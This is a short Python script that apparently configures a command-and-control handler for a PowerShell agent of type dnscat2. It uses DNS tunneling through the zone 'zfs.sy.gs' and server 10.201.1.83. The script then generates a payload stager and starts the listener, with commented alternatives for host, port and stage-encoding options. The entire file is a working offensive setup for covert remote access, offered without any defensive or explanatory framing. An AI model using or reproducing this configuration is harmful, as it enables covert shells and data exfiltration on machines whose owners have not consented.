#!/usr/bin/python3

from syhandler.handler import Handler

#import os.path
#installPath = os.path.abspath(os.path.dirname(__file__))
#print_debug("Main", "installPath = {}".format(installPath))

handler = Handler()

handler.setoption("PLATFORM", "POWERSHELL")
handler.setoption("TRANSPORT", "DNS")
#handler.setoption("LHOST", "127.0.0.1")
#handler.setoption("LPORT", "0")
handler.setoption("AGENTTYPE", "DNSCAT2")
handler.setoption("ZONE", "zfs.sy.gs")
handler.setoption("DNSSERVER", "10.201.1.83")
#handler.setoption("LPORT", "5000")
#handler.setoption("BLUB", "TEST")

#handler.setoption("STAGEENCODING", "FALSE")
#handler.setoption("STAGEAUTHENTICATION", "FALSE")
#handler.setoption("LHOST", "10.201.1.83")

handler.generatestager()

handler.run()

